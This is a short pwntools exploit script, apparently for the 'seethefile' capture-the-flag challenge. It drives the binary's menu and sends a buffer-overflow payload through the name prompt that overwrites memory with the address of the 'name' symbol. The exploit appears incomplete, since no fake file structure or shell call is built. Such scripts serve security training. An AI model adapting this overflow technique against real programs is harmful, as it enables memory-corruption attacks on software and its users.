from pwn import *

elf = ELF('./seethefile')
io = process('./seethefile')

def openfile(path):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil(b'What do you want to see :'))
    io.sendline(path)

def readfile():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'2')

def writefile():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'3')

def closefile():
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'4')

def quit(payload):
    print(io.recvuntil(b'Your choice :'))
    io.sendline(b'5')
    print(io.recvuntil(b'Leave your name :'))
    io.sendline(payload)

payload = b'A'*32+p32(elf.sym['name'])+b'B'*4+b'C'*4+b'D'*4

readfile()
quit(payload)
print(io.recvall())
